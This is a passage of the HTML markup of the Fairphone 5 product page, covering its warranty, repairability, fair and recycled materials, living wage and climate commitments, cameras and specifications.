                                        <p>Matte black, sky blue or the transparent edition - with a back cover made from 100% recycled plastic.
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            <br>
                                        </p>
                                    </div>
                                </div>
                                <div>
                                    <p>
                                        <img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/075.png" loading="lazy">
                                    </p>
                                    <div>
                                        <h5>Stunning pictures &amp; videos</h5>
                                        <p>Capture every moment in beautiful, dynamic detail with 3 premium 50 megapixel cameras</p>
                                        <p><span data-fp-backdrop="fp_js_specification_backdrop">​</span>
                                    </p></div>
                                </div>
                                <div>
                                    <div>
                                        <div>
                                            <iframe src="https://player.vimeo.com/video/856694708?autoplay=1&amp;muted=1&amp;autopause=0&amp;controls=0&amp;loop=1" data-ready="true"></iframe>
                                            </div>
                                        <p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/070.png" loading="lazy">
                                    </p></div>
                                    <div>
                                        <h5>5 YEAR WARRANTY</h5>
                                        <p>Your Fairphone 5 is covered, so you don’t have to worry. It’s that simple.&nbsp;Remember to register your warranty 
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            
                                            <a href="https://www.fairphone.com/en/warranty/" target="_blank">here</a>.
                                        
                                        
                                        
                                        
                                        
                                        
                                        
                                        
                                        
                                        
                                        
                                        
                                        
                                        
                                        
                                        
                                        
                                        
                                        
                                        
                                        
                                        
                                        
                                        
                                        
                                        
                                        
                                        
                                        </p>
                                    </div>
                                </div>
                                <div>
                                    <p>
                                        <img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/091.png" loading="lazy">
                                    </p>
                                    <div>
                                        <h5>SOFTWARE UPDATES UNTIL 2031</h5>
                                        <p>That’s 8 years of support and security guaranteed. You can count on us to keep your phone running smoothly.</p>
                                    </div>
                                </div>
                                <div>
                                    <div>
                                        <div>
                                            <iframe src="https://player.vimeo.com/video/856694826?autoplay=1&amp;muted=1&amp;autopause=0&amp;controls=0&amp;loop=1" data-ready="true"></iframe>
                                            </div>
                                        <p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/071.png" loading="lazy">
                                    </p></div>
                                    <div>
                                        <h5>More than 70% fair or recycled focus materials</h5>
                                        <p>Gold, cobalt, lithium, plastics and many more - That's a groundbreaking innovation (literally).</p>
                                    </div>
                                </div>
                                <div>
                                    <p>
                                        <img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/105.png" loading="lazy" data-bs-original-title="" title="" aria-describedby="tooltip903756">
                                    </p>
                                    <div>
                                        <h5>EASY TO REPAIR</h5>
                                        <p>Nothing in the Fairphone 5 is glued shut. You can just fix it yourself and make it last. It’s that easy.</p>
                                    </div>
                                </div>
                                <div>
                                        <h5>A dynamic OLED screen</h5>
                                        <p>Stunning picture quality with super smooth motion performance - bright and vibrant even in direct sunlight.</p>
                                    </div>
                            </div>
                </div>
            <section id="section2" data-snippet="s_fp_wwwww_004" data-name="wwwww 004">
                <div>
                    <h2>Designed for you.</h2>
                    <div>
                        <div>
                            <p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/107.png" loading="lazy">
                            </p>
                            <div>
                                <h4>Futureproof performance until 2031</h4>
                                <p>Your Fairphone 5 is fast - really fast. The unique Qualcomm® QCM6490 (Octa Core) extended life chipset and our industry leading support promise will make sure it outlives most other phones: It’s backed with OS*, software and security updates until 2031.
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    <br>
                                </p>
                                <p>(*We plan at least 5 Android OS version updates after Android 13)
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    <br>
                                </p>
                            </div>
                        </div>
                        <div>
                            <div>
                                    <iframe src="https://player.vimeo.com/video/856694708?autoplay=1&amp;muted=1&amp;autopause=0&amp;controls=0&amp;loop=1" data-ready="true"></iframe>
                                    </div>
                            <div>
                                <h4>5 year warranty</h4>
                                <p>You want to keep your phone for longer? We’ve got you covered with our unique 5 year warranty promise. No matter what you do or where you go, run smoothly, safely and efficiently for five years.  
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    <br>
                                </p>
                                <p>*Remember to register to get the free 5-year warranty extension. T&amp;C’s apply.</p>
                            </div>
                        </div>
                        <div>
                            <div>
                                    <iframe src="https://player.vimeo.com/video/856694936?autoplay=1&amp;muted=1&amp;autopause=0&amp;controls=0&amp;loop=1" data-ready="true"></iframe>
                                    </div>
                            <div>
                                <h4>Built to last</h4>
                                <p>Made for any lifestyle. Durable and sleek. Crafted to last and it’s easy to repair with modular parts, so you can take pride in what you own.
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    <br>
                                </p>
                                <p><span data-fp-light-box="light_box_1">
                                    <i></i>
                                    <span>More about modularity</span>
                                </span>
                            </p></div>
                        </div>
                    </div>
                </div>
                <div id="light_box_1">
                            <h2>Fairphone 5 is built to last</h2>
                            <h3>Our Fairphones are built with a modular design.</h3>
                            <p>That means that you replace only what you need when you need it. No part of your Fairphone is glued shut, so you can repair it
                            yourself. Instead of sending in your whole phone to be fixed or buying a new one, you can order the part and fix it within minutes. Saving the
                            cost of a new phone, and empowering you to hold onto what you own. You won’t want to let go.
                        </p>
                        </div>
            </section>
            <section data-snippet="s_fp_wwwww_005" data-name="wwwww 005">
                <div>
                    <h2>Easy to repair</h2>
                    <p>Clara just got her new Fairphone 5. We asked her to swap out the camera module to show you how easy it is. Saving money, time, and impact on the planet. Check it out.</p>
                    <div>
                        <iframe title="vimeo-player" src="https://player.vimeo.com/video/858945161?controls=0" allow="autoplay" data-ready="true"></iframe>
                        </div>
                    <p><span data-fp-light-box="light_box_6">​</span>
                        <br>
                    </p>
                </div>
                <div id="light_box_6">
                                <h2>Fairphone 5: cost-effective repairs</h2>
                                <div>
                                        <div>
                                                <p>spare part:</p>
                                                <p>battery</p>
                                                <p>display</p>
                                                <p>Usb-c</p>
                                                <p>back cover</p>
                                                <p>camera</p>
                                                <p>selfie cam</p>
                                            </div>
                                        <div>
                                            <div>
                                                <p>Repair cost saving</p>
                                                <p>64%</p>
                                                <p>63%</p>
                                                <p>84%</p>
                                                <p>87%</p>
                                                <p>46%</p>
                                                <p>65%</p>
                                            </div>
                                            <div>
                                                <p>Fairphone 4* repair costs</p>
                                                <p>€ 29,95</p>
                                                <p>€ 79,95</p>
                                                <p>€ 14,95</p>
                                                <p>€ 19,95</p>
                                                <p>€ 79,95</p>
                                                <p>€ 29,95</p>
                                            </div>
                                            <div>
                                                <p>Average smartphone repair costs**</p>
                                                <p>€ 83,60</p>
                                                <p>€ 216,40</p>
                                                <p>€ 95,25</p>
                                                <p>€ 155,50</p>
                                                <p>€ 148,50</p>
                                                <p>€ 86,25</p>
                                            </div>
                                        </div>
                                    </div>
                                <p>* The 'Average smartphone repair costs' were calculated using the repair costs shown on the websites of 2
                                well-known
                                manufacturers, between 16 – 27 Feb 2023. We compared Fairphone 5 to the equivalent flagship models of these manufacturers, including the
                                release date.
                            </p>
                                <p>** Fairphone repair costs shown do not include shipping costs.</p>
                            </div>
            </section>
            <div data-snippet="s_fp_wwwww_006" data-name="wwwww 006">
                    <h2>Take a look inside</h2>
                    <div id="fp_js_slider">
                                <div>
                                    <p>
                                        <img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/077.png" loading="lazy">
                                    </p>
                                    <div>
                                        <h5>Fairphone 5</h5>
                                        <p>The Fairphone 5 is our most sustainable phone yet. Made with more fair and recycled materials. Here’s a glimpse at what’s inside.
                                    </p>
                                    </div>
                                </div>
                                <div>
                                    <p>
                                        <img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/078.png" loading="lazy">
                                    </p>
                                    <div>
                                        <h5>Our fairest battery</h5>
                                        <p>With a capacity of 4200 mAh it will last all day. You can easily swap it out yourself in seconds and it comes with more fair
                                        materials inside and integrated in the supply chain than ever.
                                    </p>
                                    </div>
                                </div>
                                <div>
                                    <p>
                                        <img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/079.png" loading="lazy">
                                    </p>
                                    <div>
                                        <h5>OLED screen</h5>
                                        <p>The Fairphone 5’s OLED screen module is made with durable Corning Gorilla Glass and it’s easily replaceable. All you need is a
                                        screwdriver and a few minutes.
                                    </p>
                                    </div>
                                </div>
                                <div>
                                    <p>
                                        <img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/080.png" loading="lazy">
                                    </p>
                                    <div>
                                        <h5>USB-C port</h5>
                                        <p>Just in case this small but vital little connector ever decides to take a break or call it quits, we’ve made it a replaceable spare
                                        part for the Fairphone 5.
                                    </p>
                                    </div>
                                </div>
                                <div>
                                    <p>
                                        <img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/081.png" loading="lazy">
                                    </p>
                                    <div>
                                        <h5>Loudspeaker</h5>
                                        <p>The Fairphone 5 contains 100% recycled rare earth elements and 90% recycled plastics for the speaker cover, as well as Fairtrade
                                        gold in the supply chain.
                                    </p>
                                    </div>
                                </div>
                            </div>
                    
                </div>
            <section id="section3" data-snippet="s_fp_wwwww_007" data-name="wwwww 007">
                <div>
                    <h2>Made fair.</h2>
                    <div>
                        <div>
                            <div>
                                    <iframe src="https://player.vimeo.com/video/856694826?autoplay=1&amp;muted=1&amp;autopause=0&amp;controls=0&amp;loop=1" data-ready="true"></iframe>
                                    </div>
                            <div>
                                <h4>More than 70% fair focus materials
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    <br>
                                </h4>
                                <p>We’ve stepped up our game for the Fairphone 5, with more than 70% fair focus or recycled materials. And we’re
                                improving supply chain transparency and taking responsibility for our material footprint.
                            </p>
                                <p><span data-fp-light-box="light_box_2">
                                    <i></i>
                                    <span>More about our materials</span>
                                </span>
                            </p></div>
                        </div>
                        <div>
                            <p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/076.png" loading="lazy" data-bs-original-title="" title="" aria-describedby="tooltip495464">
                            </p>
                            <div>
                                <h4>Made with respect for people</h4>
                                <p>Every Fairphone 5 directly supports the people who made it with a $2.63 living wage bonus. With each phone, we’re
                                moving closer to a world where the makers are treated fairly, paid well and take pride in what they do.
                            </p>
                                <p><span data-fp-light-box="light_box_3">
                                    <i></i>
                                    <span>Meet the makers</span>
                                </span>
                            </p></div>
                        </div>
                        <div>
                            <div>
                                    <iframe src="https://player.vimeo.com/video/856694761?autoplay=1&amp;muted=1&amp;autopause=0&amp;controls=0&amp;loop=1" data-ready="true"></iframe>
                                    </div>
                            <div>
                                <h4>Made climate conscious</h4>
                                <p>We’re avoiding and reducing carbon emissions by designing our phones to last, using recycled materials, powering the
                                assembly manufacturing with 100% renewable energy and investing in projects reducing CO2 emissions.
                            </p>
                                <p><span data-fp-light-box="light_box_4">
                                    <i></i>
                                    <span>But wait, there’s more</span>
                                </span>
                            </p></div>
                        </div>
                        <div>
                            <p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/033.png" loading="lazy" data-bs-original-title="" title="" aria-describedby="tooltip725938">
                            </p>
                            <div>
                                <h4>Electronic-waste neutral</h4>
                                <p>When you buy a Fairphone 5, we give a phone a new life or recycle the same amount of electronic waste. This means 100% compensation for the weight of electronics we put into the market. Making you phone e-waste neutral.
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    
                                    <br>
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="light_box_2">
                            <h2>Fair &amp; recycled materials</h2>
                            <p>Including fair minerals in our electronics is an iterative process. We focus on 14 materials that give us the most potential to make a positive impact on people and planet. Here’s a brief behind-the-scenes walkthrough of both our fair and recycled materials.</p>
                            <h3>
                                <strong>
                                    <span>Inside the battery</span>
                                </strong>
                                <br>
                            </h3>
                            <p>Fairphone 5 comes with our fairest battery yet: it has fair lithium and fairtrade gold in the supply chain and impact
                            cobalt
                            credits, a living wage bonus and a commitment to the highest standards on CO2 reduction and social auditing by our battery supplier.
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                <br>
                            </p>
                            <h3>Our battery (supply chain) now includes</h3>
                            <div>
                                <p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/content/104.png" loading="lazy">
                                </p>
                                <div>
                                    <div>
                                        <p><span>100%</span></p><h6>Fairtrade gold in supply chain</h6>
                                    </div>
                                    <div>
                                        <p><span>100%</span></p><h6>IRMA-ASSESSED lithium</h6>
                                    </div>
                                    <div>
                                        <p><span>100%</span></p><h6>recycled tin&nbsp;solder paste</h6>
                                    </div>
                                </div>
                            </div>
                            <ul>
                                <li>
                                    <i></i>
                                    <p>75% post-consumer recycled plastics in battery frame</p>
                                </li>
                                <li>
                                    <i></i>
                                    <p>100% recycled tin solder paste</p>
                                </li>
                                <li>
                                    <i></i>
                                    <p>80% recycled steel and nickel alloy</p>
                                </li>
                                <li>
                                    <i></i>
                                    <p>In addition, we account for 100% of the cobalt used in the battery by buying cobalt credits, which support the improvement of working
                                    conditions for artisanal cobalt miners in the DRC.
                                </p>
                                </li>
                                <li>
                                    <i></i>
                                    <p>We also account for 100% of the silver contained in the battery through buying Fairmined silver credits, which support Fairmined
                                    certified artisanal miners.
                                </p>
                                </li>
                            </ul>
                            <div>
                                <p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/content/110.png" loading="lazy">
                                </p>
                                <div>
                                    <h5>FAIRTRADE GOLD CERTIFIED</h5>
                                    <p>We’re the first and only smartphone company to integrate Fairtrade gold into our supply chain.</p>
                                    <p><a href="https://info.fairtrade.net/product/gold" data-bs-original-title="" title="" target="_blank">Fairtrade Gold website</a>
                                </p></div>
                            </div>
                            <div>
                                <div>
                                    <h5>The back cover</h5>
                                    <ul>
                                        <li>100% post-consumer recycled plastics for all the different Fairphone 5 back covers and colors.</li>
                                    </ul>
                                </div>
                                <div>
                                    <h5>The OLED display</h5>
                                    <ul>
                                        <li>The display contains 100% pre-consumer recycled indium and 90% post-consumer recycled magnesium in the display frame, as well as
                                        41% bio-circular recycled plastics.
                                    </li>
                                        <li>100% Fairtrade Gold in the supply chain.</li>
                                    </ul>
                                </div>
                                <div>
                                    <h5>Inside the speaker</h5>
                                    <ul>
                                        <li>The speaker itself contains 100% pre-consumer recycled rare earth elements and 100% recycled plastics for the speaker cover. And
                                        Fairtrade gold in the supply chain
                                    </li>
                                    </ul>
                                </div>
                                <div>
                                    <h5>Inside the BtB Connectors</h5>
                                    <ul>
                                        <li>The board-to-board connectors contain 100% Fairtrade Gold in the supply chain, and 100% post-consumer recycled plastics in the
                                        connector cover.
                                    </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                <div id="light_box_3">
                            <h2>Meet the makers</h2>
                            <h3>“We believe a fairer electronics industry is possible. By making change from the inside, we’re giving a voice to people
                            who care.”
                        </h3>
                            
                            <h3>We put people first</h3>
                            <div>
                                <p>All the parts in your device come together to work for you because people made it that way. Thousands of them. And they
                                deserve a better quality of life for them and their families. Including sufficient income, a safe workplace, and the opportunity to be
                                heard. Without them, there would be no smartphone.
                            </p>
                                <p>The main supplier of the Fairphone 5 meets the strictest standards for safe and decent working conditions (SA8000&amp;
                                ISO45001). To make a lasting impact, our approach puts workers and their needs first. Focusing on paying living wages to increase income,
                                and on strengthening worker voice and representation, as well as health&amp; safety.
                            </p>
                                <p>We’ve expanded our living wage program to also increase the wages of the people who make the components that go into your
                                phone, like the battery or the vibration motor. Supporting our suppliers and their component suppliers to understand the needs of workers.
                                Ultimately, cherishing the many hands that made your phone.
                            </p>
                            </div>
                        </div>
                <div id="light_box_4">
                            <h2>Climate conscious</h2>
                            <h3>Climate conscious and the Fairphone 5</h3>
                            <p>Climate conscious is an approach to avoiding and reducing carbon emissions by designing products that last, working with
                            our suppliers to reduce our products’ footprint and reinvesting in the planet and projects that put people first. How do we do this?
                        </p>
                            <h5>By designing to last</h5>
                            <p>Let’s face it, the production of a new phone emits a lot of CO2. Which is why we build all our devices - including your
                            Fairphone 5 - to last. Designing for longevity means making a device that’s both modular and well-supported. With a long 5-year hardware
                            warranty and an even longer 8-year software support, it’s easier to hold onto your phone for longer. To get better every time, we’re assessing
                            emissions and other environmental impacts of our products in publicly available life cycle assessments. You can find all finished assessments
                            
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                <a href="https://www.fairphone.com/en/resources-policies/" data-bs-original-title="" title="" target="_blank">here</a>.
                        
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            </p>
                            <h5>By working with our suppliers</h5>
                            <p>We’ve partnered with our final assembly and battery manufacturers to implement renewable energy for the production of
                            Fairphone 5. But this is not where we stop. By working with our suppliers to set climate targets we stimulate carbon reduction in our supply
                            chain - beyond Fairphone products. We also stepped up our materials sourcing with your Fairphone 5. Inside your phone is recycled aluminum,
                            magnesium, rare earth elements, tin, nickel, zinc, copper, plastics, and for the first time, indium.
                        </p>
                            <h5>By investing in the planet</h5>
                            <p>Through investing in Gold Standard certified projects in 
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                <a href="https://www.goldstandard.org/projects/improved-cookstoves-social-and-environmental-impact-uganda#:~:text=Project%20impacts%20and%20benefits%3A%201%20450%2C000%2B%20efficient%20stoves,avoided%20by%20the%20project%20each%20year.%20%C3%89l%C3%A9ments%20suppl%C3%A9mentaires" target="_blank" data-bs-original-title="" title="">Uganda</a> and the 
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                <a href="https://www.co2logic.com/en/co2logic-wwf-protect-virunga-national-park-drc-through-reforestation-and-sustainable-energy-project#:~:text=The%20Gold%20Standard%20certified%20%E2%80%98EcoMakala%E2%80%99%20project%20aims%20to,Virunga%20National%20Park%20in%20the%20North%20Kivu%20region." target="_blank" data-bs-original-title="" title="">Democratic Republic of the Congo</a>, we’re helping
                            to reduce CO2 emissions while contributing to community-based activities. Our contribution matches the remaining emissions of Fairphone 5’s
                            lifecycle.
                        
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            </p>
                        </div>
            </section>
            <div id="section4" data-snippet="s_fp_wwwww_008" data-name="wwwww 008">
                    <h2>
                        <span>3 better cameras</span>
                        <span>for a better planet</span>
                    </h2>
                    <p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/085.png" loading="eager">
                </p></div>
            
            <div data-snippet="s_fp_wwwww_010" data-name="wwwww 010">
                    <h5>*SHOT ON FAIRPHONE</h5>
                    <h3>Premium&nbsp;Dual-Camera</h3>
                    <h5>50MP Dual-Lenses
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        <br>
                    </h5>
                    <p>The real deal: fast, sharp, reliable and ready when you are.</p>
                    <p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/110.png" loading="eager">
                    </p>
                </div>
            <div data-snippet="s_fp_wwwww_011" data-name="wwwww 011">
                        <div>
                            <h3>Superior image
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                
                                <br>
                            quality
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            </h3>
                            <p>Capture your world in beautiful, vivid detail. This powerhouse of a wide-angle lens never misses.</p>
                        </div>
                        <p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/094.png" loading="lazy">
                        </p>
                    </div>
            <div data-snippet="s_fp_wwwww_012" data-name="wwwww 012">
                    <h2>Ultra Wide</h2>
                    <h4>expand your horizons</h4>
                    <p>Add a whole new perspective to your images with the versatile ultrawide lens.</p>
                </div>
            <div data-snippet="s_fp_wwwww_013" data-name="wwwww 013">
                        <div>
                            <h3>Level up your selfies</h3>
                            <p>Need a selfie-camera that is sure to keep up with you, no matter the scene or setting? This 50 megapixel lens has got you
                            covered.
                        </p>
                        </div>
                        <div>
                            <p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/103.png" loading="lazy">
                            </p>
                            <p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/104.png" loading="lazy">
                            </p>
                        </div>
                    </div>
            <div data-snippet="s_fp_wwwww_014" data-name="wwwww 014">
                    <h3>Fairly Pro</h3>
                    
                </div>
            <div data-snippet="s_fp_wwwww_015" data-name="wwwww 015">
                            <h3>Super fast auto-focus</h3>
                            <h5>Never miss a single shot.</h5>
                            <p>With zero shutter lag, blazing auto-focus and advanced face recognition, you’ll get the shot every time.</p>
                        </div>
            <div data-snippet="s_fp_wwwww_016" data-name="wwwww 016">
                        <div>
                            <h2>Stunning videos</h2>
                            <h5>Your world in 4K</h5>
                            <ul>
                                <li>4K video resolution</li>
                                <li>Slow Motion: up to 240 frames per second</li>
                                <li>HDR videos</li>
                                <li>Super smooth handheld videos</li>
                            </ul>
                        </div>
                        <div>
                            <iframe title="vimeo-player" src="https://player.vimeo.com/video/858981453?controls=0" allow="autoplay" data-ready="true"></iframe>
                            </div>
                    </div>
            <div data-snippet="s_fp_wwwww_017" data-name="wwwww 017">
                    <h3>Action ready</h3>
                    <h5>NEXT LEVEL STABILIZATION</h5>
                    <p>Whether you’re filming while hiking up a rocky trail or chasing your kids through the park, the advanced stabilization guarantees
                    buttery smooth handheld videos.
                </p>
                    <div>
                        <iframe src="https://player.vimeo.com/video/858929273?autoplay=1&amp;muted=1&amp;autopause=0&amp;controls=0&amp;loop=1" data-ready="true"></iframe>
                        <p>Without action mode</p>
                        </div>
                    <p>With action mode</p>
                    <div>
                        <iframe src="https://player.vimeo.com/video/858930807?autoplay=1&amp;muted=1&amp;autopause=0&amp;controls=0&amp;loop=1" data-ready="true"></iframe>
                        </div>
                    <div>
                        <p>With action mode</p>
                        <p>Without action mode</p>
                    </div>
                    <h5>#SHOTONFAIRPHONE</h5>
                </div>
            <section id="section5" data-snippet="s_fp_wwwww_018" data-name="wwwww 018">
                <div>
                        <h2>All the functionality you need</h2>
                        <div>
                            <video muted="true" loop="true" autoplay="true">
                                <source src="https://shop.fairphone.com/theme_fairphone/static/src/videos/05.webm" type="video/webm">
                            </video>
                            <p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/108.png" loading="lazy">
                        </p></div>
                        <div>
                            <h4>Fast, powerful, reliable - for years to come.</h4>
                            <div>
                                <div>
                                        <h5>intuitive Android™ 13</h5>
                                        <p>A state-of-the-art user experience that’s yours to customize and yours to control. With added security. And it comes with zero
                                        bloatware, as clean as Android gets. Make it your own.
                                    </p>
                                    </div>
                                <div>
                                        <h5>dynamic oled screen</h5>
                                        <p>Stunning picture quality with super smooth motion performance - bright and vibrant even in direct sunlight. It’s made with durable
                                        Corning Gorilla Glass and it’s easily replaceable.
                                    </p>
                                    </div>
                                <div>
                                        <h5>super FAST 5g speed</h5>
                                        <p>Introducing 5G speed. Video call your friends and family in HD, stream your music instantly and watch your movies on the move. Super fast speed that’s also future-proof.</p>
                                    </div>
                                <div>
                                        <h5>dual sim</h5>
                                        <p>Enjoy the flexibility of dual SIM functionality. Balance your work with one SIM and your private life with an e-SIM, or keep in touch with loved ones abroad. You have options.</p>
                                    </div>
                            </div>
                            <p><span data-fp-backdrop="fp_js_specification_backdrop">see all specifications</span>
                        </p></div>
                    </div>
                <div id="fp_js_specification_backdrop">
                            <h3>Specifications</h3>
                            <p>The Fairphone 5 is packed with future-proof specs</p>
                            <div id="fp_js_specification_slider">
                                        <div>
                                            <p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/088.png" loading="lazy">
                                            </p>
                                            <h5>Matte black</h5>
                                        </div>
                                        <div>
                                            <p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/089.png" loading="lazy">
                                            </p>
                                            <h5>SKY BLUE</h5>
                                        </div>
                                        <div>
                                            <p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/090.png" loading="lazy">
                                            </p>
                                            <h5>TRANSPARENT</h5>
                                        </div>
                                    </div>
                            <div>
                                <div>
                                    <h5>DISPLAY</h5>
                                    <div>
                                        <p><i></i>
                                            <span>REPLACEABLE</span>
                                        </p>
                                        <ul>
                                            <li>6.46 inch FullHD+</li>
                                            <li>OLED touchscreen with Pixelworks Processor for image enhancements and adaptive colors 880 nits peak brightness, 2 min</li>
                                            <li>Hole punch camera -&gt; Screen to body ratio 85%</li>
                                            <li>90Hz Screen</li>
                                            <li>20:9 aspect ratio</li>
                                            <li>1224x2700 resolution</li>
                                            <li>Corning Gorilla Glass 5, 0.7mm, fully laminated with oleophobic coating</li>
                                            <li>No. of colors: 16.7 million, 1000000:1 contrast</li>
                                            <li>New, better speaker, which are now stereo</li>
                                        </ul>
                                    </div>
                                    <p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/106.png" loading="lazy">
                                    </p>
                                </div>
                                <div>
                                    <h5>DIMENSIONS</h5>
                                    <div>
                                        <ul>
                                            <li>162mm x 75.5mm x 10.5mm</li>
                                        </ul>
                                    </div>
                                    <p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/093.png?ver=2" loading="lazy">
                                    </p>
                                </div>
                                <div>
                                    <h5>Rear cameras</h5>
                                    <div>
                                        <p><i></i>
                                            <span>REPLACEABLE</span>
                                        </p>
                                        <p>Main Camera:</p>
                                        <ul>
                                            <li>50MP rear cameras • F1.88, Sony IMX 800</li>
                                            <li>1/1.56 Inch size, 1.0um Pixel size</li>
                                            <li>Different modes:</li>
                                            <ul>
                                                <li>50MP “High resolution”</li>
                                                <li>Combining 4 Pixels next to each other “Pixel Binning” to collect more light for better dynamic range -&gt; normal mode, 12.5
                                                MP
                                            </li>
                                            </ul>
                                            <li>Optical image stabilization + electronic image stabilization</li>
                                            <li>84.1 degree field of view</li>
                                            <li>Number of lens elements: 6 (with anti reflective coating)</li>
                                            <li>Up to 8x digital zoom</li>
                                            <li>Ultra Wide lens:</li>
                                            <ul>
                                                <li>50 megapixels -&gt; 12.5 megapixel output (pixel binning), 1/2.51 inch, 0.7 um pixel size (“1.4 um” when pixel binning),
                                                F2.2. SONY IMX 858
                                            </li>
                                            </ul>
                                            <li>Autofocus</li>
                                            <ul>
                                                <li>Macro Mode (minimum focus distance 2.5cm)</li>
                                                <li>Electronic image stabilization</li>
                                                <li>117 degree field of view</li>
                                                <li>6 lens elements</li>
                                            </ul>
                                            <p>Both rear cameras
                                        
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                <br>
                                            </p>
                                            <ul>
                                                <li>Time of flight sensor</li>
                                            </ul>
                                            <p>Video
                                        
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                
                                                <br>
                                            </p>
                                            <ul>
                                                <li>Max video resolution 4000 x 3000 (4K UHD)
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    <br>
                                                </li>
                                                <li>Video capture 1080p @ 30/60 fps 4K video resolution at 30fps
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    <br>
                                                </li>
                                                <li>Slow-motion @ 120fps and 240fps</li>
                                            </ul>
                                        </ul>
                                    </div>
                                    <p><img src="https://shop.fairphone.com/theme_fairphone/static/src/img/final_content/091.png" loading="eager">
                                    </p>
                                </div>
                                <div>
                                    <h5>SELFIE camera</h5>
                                    <div>
                                        <p><i></i>
                                            <span>REPLACEABLE</span>
                                        </p>
                                        <p>50MP selfie camera (pixel binning -&gt; 12,5 megapixel output)</p>
                                        <ul>
